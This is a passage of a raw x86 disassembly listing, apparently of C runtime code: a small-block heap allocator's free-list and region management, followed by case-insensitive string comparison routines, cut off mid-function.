0000476B  83F920            cmp ecx,byte +0x20
0000476E  731C              jnc 0x478c
00004770  BA00000080        mov edx,0x80000000
00004775  D3EA              shr edx,cl
00004777  8D4C0104          lea ecx,[ecx+eax+0x4]
0000477B  F7D2              not edx
0000477D  2154B044          and [eax+esi*4+0x44],edx
00004781  FE09              dec byte [ecx]
00004783  752B              jnz 0x47b0
00004785  8B4D08            mov ecx,[ebp+0x8]
00004788  2111              and [ecx],edx
0000478A  EB24              jmp short 0x47b0
0000478C  83C1E0            add ecx,byte -0x20
0000478F  BA00000080        mov edx,0x80000000
00004794  D3EA              shr edx,cl
00004796  8B4D0C            mov ecx,[ebp+0xc]
00004799  8D4C0104          lea ecx,[ecx+eax+0x4]
0000479D  F7D2              not edx
0000479F  2194B0C4000000    and [eax+esi*4+0xc4],edx
000047A6  FE09              dec byte [ecx]
000047A8  7506              jnz 0x47b0
000047AA  8B4D08            mov ecx,[ebp+0x8]
000047AD  215104            and [ecx+0x4],edx
000047B0  8B4DF8            mov ecx,[ebp-0x8]
000047B3  8B5108            mov edx,[ecx+0x8]
000047B6  8B4904            mov ecx,[ecx+0x4]
000047B9  894A04            mov [edx+0x4],ecx
000047BC  8B4DF8            mov ecx,[ebp-0x8]
000047BF  8B5104            mov edx,[ecx+0x4]
000047C2  8B4908            mov ecx,[ecx+0x8]
000047C5  894A08            mov [edx+0x8],ecx
000047C8  8B55F8            mov edx,[ebp-0x8]
000047CB  837DEC00          cmp dword [ebp-0x14],byte +0x0
000047CF  7509              jnz 0x47da
000047D1  397D0C            cmp [ebp+0xc],edi
000047D4  0F8489000000      jz near 0x4863
000047DA  8B4DF0            mov ecx,[ebp-0x10]
000047DD  8D0CF9            lea ecx,[ecx+edi*8]
000047E0  8B4904            mov ecx,[ecx+0x4]
000047E3  894A04            mov [edx+0x4],ecx
000047E6  8B4DF0            mov ecx,[ebp-0x10]
000047E9  8D0CF9            lea ecx,[ecx+edi*8]
000047EC  894A08            mov [edx+0x8],ecx
000047EF  895104            mov [ecx+0x4],edx
000047F2  8B4A04            mov ecx,[edx+0x4]
000047F5  895108            mov [ecx+0x8],edx
000047F8  8B4A04            mov ecx,[edx+0x4]
000047FB  3B4A08            cmp ecx,[edx+0x8]
000047FE  7563              jnz 0x4863
00004800  8A4C0704          mov cl,[edi+eax+0x4]
00004804  83FF20            cmp edi,byte +0x20
00004807  884D0F            mov [ebp+0xf],cl
0000480A  FEC1              inc cl
0000480C  884C0704          mov [edi+eax+0x4],cl
00004810  7325              jnc 0x4837
00004812  807D0F00          cmp byte [ebp+0xf],0x0
00004816  750E              jnz 0x4826
00004818  BB00000080        mov ebx,0x80000000
0000481D  8BCF              mov ecx,edi
0000481F  D3EB              shr ebx,cl
00004821  8B4D08            mov ecx,[ebp+0x8]
00004824  0919              or [ecx],ebx
00004826  BB00000080        mov ebx,0x80000000
0000482B  8BCF              mov ecx,edi
0000482D  D3EB              shr ebx,cl
0000482F  8D44B044          lea eax,[eax+esi*4+0x44]
00004833  0918              or [eax],ebx
00004835  EB29              jmp short 0x4860
00004837  807D0F00          cmp byte [ebp+0xf],0x0
0000483B  7510              jnz 0x484d
0000483D  8D4FE0            lea ecx,[edi-0x20]
00004840  BB00000080        mov ebx,0x80000000
00004845  D3EB              shr ebx,cl
00004847  8B4D08            mov ecx,[ebp+0x8]
0000484A  095904            or [ecx+0x4],ebx
0000484D  8D4FE0            lea ecx,[edi-0x20]
00004850  BF00000080        mov edi,0x80000000
00004855  D3EF              shr edi,cl
00004857  8D84B0C4000000    lea eax,[eax+esi*4+0xc4]
0000485E  0938              or [eax],edi
00004860  8B5DF4            mov ebx,[ebp-0xc]
00004863  8B45F0            mov eax,[ebp-0x10]
00004866  891A              mov [edx],ebx
00004868  895C13FC          mov [ebx+edx-0x4],ebx
0000486C  FF08              dec dword [eax]
0000486E  0F85FA000000      jnz near 0x496e
00004874  A1B4721E00        mov eax,[0x1e72b4]
00004879  85C0              test eax,eax
0000487B  0F84DF000000      jz near 0x4960
00004881  8B0DAC721E00      mov ecx,[0x1e72ac]
00004887  8B3DE8561E00      mov edi,[0x1e56e8]
0000488D  C1E10F            shl ecx,0xf
00004890  03480C            add ecx,[eax+0xc]
00004893  BB00800000        mov ebx,0x8000
00004898  6800400000        push dword 0x4000
0000489D  53                push ebx
0000489E  51                push ecx
0000489F  FFD7              call edi
000048A1  8B0DAC721E00      mov ecx,[0x1e72ac]
000048A7  A1B4721E00        mov eax,[0x1e72b4]
000048AC  BA00000080        mov edx,0x80000000
000048B1  D3EA              shr edx,cl
000048B3  095008            or [eax+0x8],edx
000048B6  A1B4721E00        mov eax,[0x1e72b4]
000048BB  8B0DAC721E00      mov ecx,[0x1e72ac]
000048C1  8B4010            mov eax,[eax+0x10]
000048C4  83A488C400000000  and dword [eax+ecx*4+0xc4],byte +0x0
000048CC  A1B4721E00        mov eax,[0x1e72b4]
000048D1  8B4010            mov eax,[eax+0x10]
000048D4  FE4843            dec byte [eax+0x43]
000048D7  A1B4721E00        mov eax,[0x1e72b4]
000048DC  8B4810            mov ecx,[eax+0x10]
000048DF  80794300          cmp byte [ecx+0x43],0x0
000048E3  7509              jnz 0x48ee
000048E5  836004FE          and dword [eax+0x4],byte -0x2
000048E9  A1B4721E00        mov eax,[0x1e72b4]
000048EE  837808FF          cmp dword [eax+0x8],byte -0x1
000048F2  756C              jnz 0x4960
000048F4  53                push ebx
000048F5  6A00              push byte +0x0
000048F7  FF700C            push dword [eax+0xc]
000048FA  FFD7              call edi
000048FC  A1B4721E00        mov eax,[0x1e72b4]
00004901  FF7010            push dword [eax+0x10]
00004904  6A00              push byte +0x0
00004906  FF35C0721E00      push dword [0x1e72c0]
0000490C  FF15D8561E00      call near [0x1e56d8]
00004912  A1B8721E00        mov eax,[0x1e72b8]
00004917  8B15BC721E00      mov edx,[0x1e72bc]
0000491D  8D0480            lea eax,[eax+eax*4]
00004920  C1E002            shl eax,0x2
00004923  8BC8              mov ecx,eax
00004925  A1B4721E00        mov eax,[0x1e72b4]
0000492A  2BC8              sub ecx,eax
0000492C  8D4C11EC          lea ecx,[ecx+edx-0x14]
00004930  51                push ecx
00004931  8D4814            lea ecx,[eax+0x14]
00004934  51                push ecx
00004935  50                push eax
00004936  E855DEFFFF        call 0x2790
0000493B  8B4508            mov eax,[ebp+0x8]
0000493E  83C40C            add esp,byte +0xc
00004941  FF0DB8721E00      dec dword [0x1e72b8]
00004947  3B05B4721E00      cmp eax,[0x1e72b4]
0000494D  7603              jna 0x4952
0000494F  83E814            sub eax,byte +0x14
00004952  8B0DBC721E00      mov ecx,[0x1e72bc]
00004958  890DB0721E00      mov [0x1e72b0],ecx
0000495E  EB03              jmp short 0x4963
00004960  8B4508            mov eax,[ebp+0x8]
00004963  A3B4721E00        mov [0x1e72b4],eax
00004968  8935AC721E00      mov [0x1e72ac],esi
0000496E  5F                pop edi
0000496F  5E                pop esi
00004970  5B                pop ebx
00004971  C9                leave
00004972  C3                ret
00004973  55                push ebp
00004974  8BEC              mov ebp,esp
00004976  83EC14            sub esp,byte +0x14
00004979  A1B8721E00        mov eax,[0x1e72b8]
0000497E  8B15BC721E00      mov edx,[0x1e72bc]
00004984  53                push ebx
00004985  56                push esi
00004986  8D0480            lea eax,[eax+eax*4]
00004989  57                push edi
0000498A  8D3C82            lea edi,[edx+eax*4]
0000498D  8B4508            mov eax,[ebp+0x8]
00004990  897DFC            mov [ebp-0x4],edi
00004993  8D4817            lea ecx,[eax+0x17]
00004996  83E1F0            and ecx,byte -0x10
00004999  894DF0            mov [ebp-0x10],ecx
0000499C  C1F904            sar ecx,0x4
0000499F  49                dec ecx
000049A0  83F920            cmp ecx,byte +0x20
000049A3  7D0E              jnl 0x49b3
000049A5  83CEFF            or esi,byte -0x1
000049A8  D3EE              shr esi,cl
000049AA  834DF8FF          or dword [ebp-0x8],byte -0x1
000049AE  8975F4            mov [ebp-0xc],esi
000049B1  EB10              jmp short 0x49c3
000049B3  83C1E0            add ecx,byte -0x20
000049B6  83C8FF            or eax,byte -0x1
000049B9  33F6              xor esi,esi
000049BB  D3E8              shr eax,cl
000049BD  8975F4            mov [ebp-0xc],esi
000049C0  8945F8            mov [ebp-0x8],eax
000049C3  A1B0721E00        mov eax,[0x1e72b0]
000049C8  8BD8              mov ebx,eax
000049CA  3BDF              cmp ebx,edi
000049CC  895D08            mov [ebp+0x8],ebx
000049CF  7319              jnc 0x49ea
000049D1  8B4B04            mov ecx,[ebx+0x4]
000049D4  8B3B              mov edi,[ebx]
000049D6  234DF8            and ecx,[ebp-0x8]
000049D9  23FE              and edi,esi
000049DB  0BCF              or ecx,edi
000049DD  750B              jnz 0x49ea
000049DF  83C314            add ebx,byte +0x14
000049E2  3B5DFC            cmp ebx,[ebp-0x4]
000049E5  895D08            mov [ebp+0x8],ebx
000049E8  72E7              jc 0x49d1
000049EA  3B5DFC            cmp ebx,[ebp-0x4]
000049ED  7579              jnz 0x4a68
000049EF  8BDA              mov ebx,edx
000049F1  3BD8              cmp ebx,eax
000049F3  895D08            mov [ebp+0x8],ebx
000049F6  7315              jnc 0x4a0d
000049F8  8B4B04            mov ecx,[ebx+0x4]
000049FB  8B3B              mov edi,[ebx]
000049FD  234DF8            and ecx,[ebp-0x8]
00004A00  23FE              and edi,esi
00004A02  0BCF              or ecx,edi
00004A04  7505              jnz 0x4a0b
00004A06  83C314            add ebx,byte +0x14
00004A09  EBE6              jmp short 0x49f1
00004A0B  3BD8              cmp ebx,eax
00004A0D  7559              jnz 0x4a68
00004A0F  3B5DFC            cmp ebx,[ebp-0x4]
00004A12  7311              jnc 0x4a25
00004A14  837B0800          cmp dword [ebx+0x8],byte +0x0
00004A18  7508              jnz 0x4a22
00004A1A  83C314            add ebx,byte +0x14
00004A1D  895D08            mov [ebp+0x8],ebx
00004A20  EBED              jmp short 0x4a0f
00004A22  3B5DFC            cmp ebx,[ebp-0x4]
00004A25  7526              jnz 0x4a4d
00004A27  8BDA              mov ebx,edx
00004A29  3BD8              cmp ebx,eax
00004A2B  895D08            mov [ebp+0x8],ebx
00004A2E  730D              jnc 0x4a3d
00004A30  837B0800          cmp dword [ebx+0x8],byte +0x0
00004A34  7505              jnz 0x4a3b
00004A36  83C314            add ebx,byte +0x14
00004A39  EBEE              jmp short 0x4a29
00004A3B  3BD8              cmp ebx,eax
00004A3D  750E              jnz 0x4a4d
00004A3F  E838020000        call 0x4c7c
00004A44  8BD8              mov ebx,eax
00004A46  85DB              test ebx,ebx
00004A48  895D08            mov [ebp+0x8],ebx
00004A4B  7414              jz 0x4a61
00004A4D  53                push ebx
00004A4E  E8DA020000        call 0x4d2d
00004A53  59                pop ecx
00004A54  8B4B10            mov ecx,[ebx+0x10]
00004A57  8901              mov [ecx],eax
00004A59  8B4310            mov eax,[ebx+0x10]
00004A5C  8338FF            cmp dword [eax],byte -0x1
00004A5F  7507              jnz 0x4a68
00004A61  33C0              xor eax,eax
00004A63  E90F020000        jmp 0x4c77
00004A68  891DB0721E00      mov [0x1e72b0],ebx
00004A6E  8B4310            mov eax,[ebx+0x10]
00004A71  8B10              mov edx,[eax]
00004A73  83FAFF            cmp edx,byte -0x1
00004A76  8955FC            mov [ebp-0x4],edx
00004A79  7414              jz 0x4a8f
00004A7B  8B8C90C4000000    mov ecx,[eax+edx*4+0xc4]
00004A82  8B7C9044          mov edi,[eax+edx*4+0x44]
00004A86  234DF8            and ecx,[ebp-0x8]
00004A89  23FE              and edi,esi
00004A8B  0BCF              or ecx,edi
00004A8D  7537              jnz 0x4ac6
00004A8F  8B90C4000000      mov edx,[eax+0xc4]
00004A95  8B7044            mov esi,[eax+0x44]
00004A98  2355F8            and edx,[ebp-0x8]
00004A9B  2375F4            and esi,[ebp-0xc]
00004A9E  8365FC00          and dword [ebp-0x4],byte +0x0
00004AA2  8D4844            lea ecx,[eax+0x44]
00004AA5  0BD6              or edx,esi
00004AA7  8B75F4            mov esi,[ebp-0xc]
00004AAA  7517              jnz 0x4ac3
00004AAC  8B9184000000      mov edx,[ecx+0x84]
00004AB2  FF45FC            inc dword [ebp-0x4]
00004AB5  2355F8            and edx,[ebp-0x8]
00004AB8  83C104            add ecx,byte +0x4
00004ABB  8BFE              mov edi,esi
00004ABD  2339              and edi,[ecx]
00004ABF  0BD7              or edx,edi
00004AC1  74E9              jz 0x4aac
00004AC3  8B55FC            mov edx,[ebp-0x4]
00004AC6  8BCA              mov ecx,edx
00004AC8  33FF              xor edi,edi
00004ACA  69C904020000      imul ecx,ecx,dword 0x204
00004AD0  8D8C0144010000    lea ecx,[ecx+eax+0x144]
00004AD7  894DF4            mov [ebp-0xc],ecx
00004ADA  8B4C9044          mov ecx,[eax+edx*4+0x44]
00004ADE  23CE              and ecx,esi
00004AE0  750D              jnz 0x4aef
00004AE2  8B8C90C4000000    mov ecx,[eax+edx*4+0xc4]
00004AE9  6A20              push byte +0x20
00004AEB  234DF8            and ecx,[ebp-0x8]
00004AEE  5F                pop edi
00004AEF  85C9              test ecx,ecx
00004AF1  7C05              jl 0x4af8
00004AF3  D1E1              shl ecx,1
00004AF5  47                inc edi
00004AF6  EBF7              jmp short 0x4aef
00004AF8  8B4DF4            mov ecx,[ebp-0xc]
00004AFB  8B54F904          mov edx,[ecx+edi*8+0x4]
00004AFF  8B0A              mov ecx,[edx]
00004B01  2B4DF0            sub ecx,[ebp-0x10]
00004B04  8BF1              mov esi,ecx
00004B06  894DF8            mov [ebp-0x8],ecx
00004B09  C1FE04            sar esi,0x4
00004B0C  4E                dec esi
00004B0D  83FE3F            cmp esi,byte +0x3f
00004B10  7E03              jng 0x4b15
00004B12  6A3F              push byte +0x3f
00004B14  5E                pop esi
00004B15  3BF7              cmp esi,edi
00004B17  0F840D010000      jz near 0x4c2a
00004B1D  8B4A04            mov ecx,[edx+0x4]
00004B20  3B4A08            cmp ecx,[edx+0x8]
00004B23  7561              jnz 0x4b86
00004B25  83FF20            cmp edi,byte +0x20
00004B28  7D2B              jnl 0x4b55
00004B2A  BB00000080        mov ebx,0x80000000
00004B2F  8BCF              mov ecx,edi
00004B31  D3EB              shr ebx,cl
00004B33  8B4DFC            mov ecx,[ebp-0x4]
00004B36  8D7C3804          lea edi,[eax+edi+0x4]
00004B3A  F7D3              not ebx
00004B3C  895DEC            mov [ebp-0x14],ebx
00004B3F  235C8844          and ebx,[eax+ecx*4+0x44]
00004B43  895C8844          mov [eax+ecx*4+0x44],ebx
00004B47  FE0F              dec byte [edi]
00004B49  7538              jnz 0x4b83
00004B4B  8B5D08            mov ebx,[ebp+0x8]
00004B4E  8B4DEC            mov ecx,[ebp-0x14]
00004B51  210B              and [ebx],ecx
00004B53  EB31              jmp short 0x4b86
00004B55  8D4FE0            lea ecx,[edi-0x20]
00004B58  BB00000080        mov ebx,0x80000000
00004B5D  D3EB              shr ebx,cl
00004B5F  8B4DFC            mov ecx,[ebp-0x4]
00004B62  8D7C3804          lea edi,[eax+edi+0x4]
00004B66  8D8C88C4000000    lea ecx,[eax+ecx*4+0xc4]
00004B6D  F7D3              not ebx
00004B6F  2119              and [ecx],ebx
00004B71  FE0F              dec byte [edi]
00004B73  895DEC            mov [ebp-0x14],ebx
00004B76  750B              jnz 0x4b83
00004B78  8B5D08            mov ebx,[ebp+0x8]
00004B7B  8B4DEC            mov ecx,[ebp-0x14]
00004B7E  214B04            and [ebx+0x4],ecx
00004B81  EB03              jmp short 0x4b86
00004B83  8B5D08            mov ebx,[ebp+0x8]
00004B86  8B4A08            mov ecx,[edx+0x8]
00004B89  8B7A04            mov edi,[edx+0x4]
00004B8C  837DF800          cmp dword [ebp-0x8],byte +0x0
00004B90  897904            mov [ecx+0x4],edi
00004B93  8B4A04            mov ecx,[edx+0x4]
00004B96  8B7A08            mov edi,[edx+0x8]
00004B99  897908            mov [ecx+0x8],edi
00004B9C  0F8494000000      jz near 0x4c36
00004BA2  8B4DF4            mov ecx,[ebp-0xc]
00004BA5  8B7CF104          mov edi,[ecx+esi*8+0x4]
00004BA9  8D0CF1            lea ecx,[ecx+esi*8]
00004BAC  897A04            mov [edx+0x4],edi
00004BAF  894A08            mov [edx+0x8],ecx
00004BB2  895104            mov [ecx+0x4],edx
00004BB5  8B4A04            mov ecx,[edx+0x4]
00004BB8  895108            mov [ecx+0x8],edx
00004BBB  8B4A04            mov ecx,[edx+0x4]
00004BBE  3B4A08            cmp ecx,[edx+0x8]
00004BC1  7564              jnz 0x4c27
00004BC3  8A4C0604          mov cl,[esi+eax+0x4]
00004BC7  83FE20            cmp esi,byte +0x20
00004BCA  884D0B            mov [ebp+0xb],cl
00004BCD  7D29              jnl 0x4bf8
00004BCF  FEC1              inc cl
00004BD1  807D0B00          cmp byte [ebp+0xb],0x0
00004BD5  884C0604          mov [esi+eax+0x4],cl
00004BD9  750B              jnz 0x4be6
00004BDB  BF00000080        mov edi,0x80000000
00004BE0  8BCE              mov ecx,esi
00004BE2  D3EF              shr edi,cl
00004BE4  093B              or [ebx],edi
00004BE6  BF00000080        mov edi,0x80000000
00004BEB  8BCE              mov ecx,esi
00004BED  D3EF              shr edi,cl
00004BEF  8B4DFC            mov ecx,[ebp-0x4]
00004BF2  097C8844          or [eax+ecx*4+0x44],edi
00004BF6  EB2F              jmp short 0x4c27
00004BF8  FEC1              inc cl
00004BFA  807D0B00          cmp byte [ebp+0xb],0x0
00004BFE  884C0604          mov [esi+eax+0x4],cl
00004C02  750D              jnz 0x4c11
00004C04  8D4EE0            lea ecx,[esi-0x20]
00004C07  BF00000080        mov edi,0x80000000
00004C0C  D3EF              shr edi,cl
00004C0E  097B04            or [ebx+0x4],edi
00004C11  8B4DFC            mov ecx,[ebp-0x4]
00004C14  8DBC88C4000000    lea edi,[eax+ecx*4+0xc4]
00004C1B  8D4EE0            lea ecx,[esi-0x20]
00004C1E  BE00000080        mov esi,0x80000000
00004C23  D3EE              shr esi,cl
00004C25  0937              or [edi],esi
00004C27  8B4DF8            mov ecx,[ebp-0x8]
00004C2A  85C9              test ecx,ecx
00004C2C  740B              jz 0x4c39
00004C2E  890A              mov [edx],ecx
00004C30  894C11FC          mov [ecx+edx-0x4],ecx
00004C34  EB03              jmp short 0x4c39
00004C36  8B4DF8            mov ecx,[ebp-0x8]
00004C39  8B75F0            mov esi,[ebp-0x10]
00004C3C  03D1              add edx,ecx
00004C3E  8D4E01            lea ecx,[esi+0x1]
00004C41  890A              mov [edx],ecx
00004C43  894C32FC          mov [edx+esi-0x4],ecx
00004C47  8B75F4            mov esi,[ebp-0xc]
00004C4A  8B0E              mov ecx,[esi]
00004C4C  85C9              test ecx,ecx
00004C4E  8D7901            lea edi,[ecx+0x1]
00004C51  893E              mov [esi],edi
00004C53  751A              jnz 0x4c6f
00004C55  3B1DB4721E00      cmp ebx,[0x1e72b4]
00004C5B  7512              jnz 0x4c6f
00004C5D  8B4DFC            mov ecx,[ebp-0x4]
00004C60  3B0DAC721E00      cmp ecx,[0x1e72ac]
00004C66  7507              jnz 0x4c6f
00004C68  8325B4721E0000    and dword [0x1e72b4],byte +0x0
00004C6F  8B4DFC            mov ecx,[ebp-0x4]
00004C72  8908              mov [eax],ecx
00004C74  8D4204            lea eax,[edx+0x4]
00004C77  5F                pop edi
00004C78  5E                pop esi
00004C79  5B                pop ebx
00004C7A  C9                leave
00004C7B  C3                ret
00004C7C  A1B8721E00        mov eax,[0x1e72b8]
00004C81  8B0DA8721E00      mov ecx,[0x1e72a8]
00004C87  56                push esi
00004C88  57                push edi
00004C89  33FF              xor edi,edi
00004C8B  3BC1              cmp eax,ecx
00004C8D  7530              jnz 0x4cbf
00004C8F  8D448950          lea eax,[ecx+ecx*4+0x50]
00004C93  C1E002            shl eax,0x2
00004C96  50                push eax
00004C97  FF35BC721E00      push dword [0x1e72bc]
00004C9D  57                push edi
00004C9E  FF35C0721E00      push dword [0x1e72c0]
00004CA4  FF15F4561E00      call near [0x1e56f4]
00004CAA  3BC7              cmp eax,edi
00004CAC  7461              jz 0x4d0f
00004CAE  8305A8721E0010    add dword [0x1e72a8],byte +0x10
00004CB5  A3BC721E00        mov [0x1e72bc],eax
00004CBA  A1B8721E00        mov eax,[0x1e72b8]
00004CBF  8B0DBC721E00      mov ecx,[0x1e72bc]
00004CC5  68C4410000        push dword 0x41c4
00004CCA  6A08              push byte +0x8
00004CCC  8D0480            lea eax,[eax+eax*4]
00004CCF  FF35C0721E00      push dword [0x1e72c0]
00004CD5  8D3481            lea esi,[ecx+eax*4]
00004CD8  FF15C8561E00      call near [0x1e56c8]
00004CDE  3BC7              cmp eax,edi
00004CE0  894610            mov [esi+0x10],eax
00004CE3  742A              jz 0x4d0f
00004CE5  6A04              push byte +0x4
00004CE7  6800200000        push dword 0x2000
00004CEC  6800001000        push dword 0x100000
00004CF1  57                push edi
00004CF2  FF15F0561E00      call near [0x1e56f0]
00004CF8  3BC7              cmp eax,edi
00004CFA  89460C            mov [esi+0xc],eax
00004CFD  7514              jnz 0x4d13
00004CFF  FF7610            push dword [esi+0x10]
00004D02  57                push edi
00004D03  FF35C0721E00      push dword [0x1e72c0]
00004D09  FF15D8561E00      call near [0x1e56d8]
00004D0F  33C0              xor eax,eax
00004D11  EB17              jmp short 0x4d2a
00004D13  834E08FF          or dword [esi+0x8],byte -0x1
00004D17  893E              mov [esi],edi
00004D19  897E04            mov [esi+0x4],edi
00004D1C  FF05B8721E00      inc dword [0x1e72b8]
00004D22  8B4610            mov eax,[esi+0x10]
00004D25  8308FF            or dword [eax],byte -0x1
00004D28  8BC6              mov eax,esi
00004D2A  5F                pop edi
00004D2B  5E                pop esi
00004D2C  C3                ret
00004D2D  55                push ebp
00004D2E  8BEC              mov ebp,esp
00004D30  51                push ecx
00004D31  8B4D08            mov ecx,[ebp+0x8]
00004D34  53                push ebx
00004D35  56                push esi
00004D36  57                push edi
00004D37  8B7110            mov esi,[ecx+0x10]
00004D3A  8B4108            mov eax,[ecx+0x8]
00004D3D  33DB              xor ebx,ebx
00004D3F  85C0              test eax,eax
00004D41  7C05              jl 0x4d48
00004D43  D1E0              shl eax,1
00004D45  43                inc ebx
00004D46  EBF7              jmp short 0x4d3f
00004D48  8BC3              mov eax,ebx
00004D4A  6A3F              push byte +0x3f
00004D4C  69C004020000      imul eax,eax,dword 0x204
00004D52  5A                pop edx
00004D53  8D843044010000    lea eax,[eax+esi+0x144]
00004D5A  8945FC            mov [ebp-0x4],eax
00004D5D  894008            mov [eax+0x8],eax
00004D60  894004            mov [eax+0x4],eax
00004D63  83C008            add eax,byte +0x8
00004D66  4A                dec edx
00004D67  75F4              jnz 0x4d5d
00004D69  8BFB              mov edi,ebx
00004D6B  6A04              push byte +0x4
00004D6D  C1E70F            shl edi,0xf
00004D70  03790C            add edi,[ecx+0xc]
00004D73  6800100000        push dword 0x1000
00004D78  6800800000        push dword 0x8000
00004D7D  57                push edi
00004D7E  FF15F0561E00      call near [0x1e56f0]
00004D84  85C0              test eax,eax
00004D86  7508              jnz 0x4d90
00004D88  83C8FF            or eax,byte -0x1
00004D8B  E993000000        jmp 0x4e23
00004D90  8D9700700000      lea edx,[edi+0x7000]
00004D96  3BFA              cmp edi,edx
00004D98  773C              ja 0x4dd6
00004D9A  8D4710            lea eax,[edi+0x10]
00004D9D  8348F8FF          or dword [eax-0x8],byte -0x1
00004DA1  8388EC0F0000FF    or dword [eax+0xfec],byte -0x1
00004DA8  8D88FC0F0000      lea ecx,[eax+0xffc]
00004DAE  C740FCF00F0000    mov dword [eax-0x4],0xff0
00004DB5  8908              mov [eax],ecx
00004DB7  8D88FCEFFFFF      lea ecx,[eax+0xffffeffc]
00004DBD  894804            mov [eax+0x4],ecx
00004DC0  C780E80F0000F00F  mov dword [eax+0xfe8],0xff0
         -0000
00004DCA  0500100000        add eax,0x1000
00004DCF  8D48F0            lea ecx,[eax-0x10]
00004DD2  3BCA              cmp ecx,edx
00004DD4  76C7              jna 0x4d9d
00004DD6  8B45FC            mov eax,[ebp-0x4]
00004DD9  8D4F0C            lea ecx,[edi+0xc]
00004DDC  05F8010000        add eax,0x1f8
00004DE1  6A01              push byte +0x1
00004DE3  5F                pop edi
00004DE4  894804            mov [eax+0x4],ecx
00004DE7  894108            mov [ecx+0x8],eax
00004DEA  8D4A0C            lea ecx,[edx+0xc]
00004DED  894808            mov [eax+0x8],ecx
00004DF0  894104            mov [ecx+0x4],eax
00004DF3  83649E4400        and dword [esi+ebx*4+0x44],byte +0x0
00004DF8  89BC9EC4000000    mov [esi+ebx*4+0xc4],edi
00004DFF  8A4643            mov al,[esi+0x43]
00004E02  8AC8              mov cl,al
00004E04  FEC1              inc cl
00004E06  84C0              test al,al
00004E08  8B4508            mov eax,[ebp+0x8]
00004E0B  884E43            mov [esi+0x43],cl
00004E0E  7503              jnz 0x4e13
00004E10  097804            or [eax+0x4],edi
00004E13  BA00000080        mov edx,0x80000000
00004E18  8BCB              mov ecx,ebx
00004E1A  D3EA              shr edx,cl
00004E1C  F7D2              not edx
00004E1E  215008            and [eax+0x8],edx
00004E21  8BC3              mov eax,ebx
00004E23  5F                pop edi
00004E24  5E                pop esi
00004E25  5B                pop ebx
00004E26  C9                leave
00004E27  C3                ret
00004E28  CC                int3
00004E29  CC                int3
00004E2A  CC                int3
00004E2B  CC                int3
00004E2C  CC                int3
00004E2D  CC                int3
00004E2E  CC                int3
00004E2F  CC                int3
00004E30  55                push ebp
00004E31  8BEC              mov ebp,esp
00004E33  57                push edi
00004E34  56                push esi
00004E35  53                push ebx
00004E36  8B750C            mov esi,[ebp+0xc]
00004E39  8B7D08            mov edi,[ebp+0x8]
00004E3C  8D059C6D1E00      lea eax,[0x1e6d9c]
00004E42  83780800          cmp dword [eax+0x8],byte +0x0
00004E46  753B              jnz 0x4e83
00004E48  B0FF              mov al,0xff
00004E4A  8BFF              mov edi,edi
00004E4C  0AC0              or al,al
00004E4E  742E              jz 0x4e7e
00004E50  8A06              mov al,[esi]
00004E52  46                inc esi
00004E53  8A27              mov ah,[edi]
00004E55  47                inc edi
00004E56  38C4              cmp ah,al
00004E58  74F2              jz 0x4e4c
00004E5A  2C41              sub al,0x41
00004E5C  3C1A              cmp al,0x1a
00004E5E  1AC9              sbb cl,cl
00004E60  80E120            and cl,0x20
00004E63  02C1              add al,cl
00004E65  0441              add al,0x41
00004E67  86E0              xchg ah,al
00004E69  2C41              sub al,0x41
00004E6B  3C1A              cmp al,0x1a
00004E6D  1AC9              sbb cl,cl
00004E6F  80E120            and cl,0x20
00004E72  02C1              add al,cl
00004E74  0441              add al,0x41
00004E76  38E0              cmp al,ah
00004E78  74D2              jz 0x4e4c
00004E7A  1AC0              sbb al,al
00004E7C  1CFF              sbb al,0xff
00004E7E  0FBEC0            movsx eax,al
00004E81  EB78              jmp short 0x4efb
00004E83  F0FF05D4721E00    lock inc dword [0x1e72d4]
00004E8A  833DD0721E0000    cmp dword [0x1e72d0],byte +0x0
00004E91  7F04              jg 0x4e97
00004E93  6A00              push byte +0x0
00004E95  EB15              jmp short 0x4eac
00004E97  F0FF0DD4721E00    lock dec dword [0x1e72d4]
00004E9E  6A13              push byte +0x13
00004EA0  E8F8DDFFFF        call 0x2c9d
00004EA5  C7042401000000    mov dword [esp],0x1
00004EAC  B8FF000000        mov eax,0xff
00004EB1  33DB              xor ebx,ebx
00004EB3  90                nop
00004EB4  0AC0              or al,al
00004EB6  7427              jz 0x4edf
00004EB8  8A06              mov al,[esi]
00004EBA  46                inc esi
00004EBB  8A1F              mov bl,[edi]
00004EBD  47                inc edi
00004EBE  38D8              cmp al,bl
00004EC0  74F2              jz 0x4eb4
00004EC2  50                push eax
00004EC3  53                push ebx
00004EC4  E837D1FFFF        call 0x2000
00004EC9  8BD8              mov ebx,eax
00004ECB  83C404            add esp,byte +0x4
00004ECE  E82DD1FFFF        call 0x2000
00004ED3  83C404            add esp,byte +0x4
00004ED6  38C3              cmp bl,al
00004ED8  74DA              jz 0x4eb4
00004EDA  1BC0              sbb eax,eax
00004EDC  83D8FF            sbb eax,byte -0x1
00004EDF  8BD8              mov ebx,eax
00004EE1  58                pop eax
00004EE2  0BC0              or eax,eax
00004EE4  7509              jnz 0x4eef
00004EE6  F0FF0DD4721E00    lock dec dword [0x1e72d4]
00004EED  EB0A              jmp short 0x4ef9
00004EEF  6A13              push byte +0x13
00004EF1  E808DEFFFF        call 0x2cfe
00004EF6  83C404            add esp,byte +0x4
00004EF9  8BC3              mov eax,ebx
00004EFB  5B                pop ebx
00004EFC  5E                pop esi
00004EFD  5F                pop edi
00004EFE  C9                leave
00004EFF  C3                ret
00004F00  55                push ebp
00004F01  8BEC              mov ebp,esp
00004F03  57                push edi
00004F04  56                push esi
00004F05  53                push ebx
00004F06  8B4D10            mov ecx,[ebp+0x10]
00004F09  0BC9              or ecx,ecx
00004F0B  0F84E9000000      jz near 0x4ffa
00004F11  8B7508            mov esi,[ebp+0x8]
00004F14  8B7D0C            mov edi,[ebp+0xc]
00004F17  8D059C6D1E00      lea eax,[0x1e6d9c]
00004F1D  83780800          cmp dword [eax+0x8],byte +0x0
00004F21  754E              jnz 0x4f71
00004F23  B741              mov bh,0x41
00004F25  B35A              mov bl,0x5a
00004F27  B620              mov dh,0x20
00004F29  8D4900            lea ecx,[ecx+0x0]
00004F2C  8A26              mov ah,[esi]
00004F2E  0AE4              or ah,ah
00004F30  8A07              mov al,[edi]
00004F32  7421              jz 0x4f55
00004F34  0AC0              or al,al
00004F36  741D              jz 0x4f55
00004F38  46                inc esi
00004F39  47                inc edi
00004F3A  38FC              cmp ah,bh
00004F3C  7206              jc 0x4f44
00004F3E  38DC              cmp ah,bl
00004F40  7702              ja 0x4f44
00004F42  02E6              add ah,dh
00004F44  38F8              cmp al,bh
00004F46  7206              jc 0x4f4e
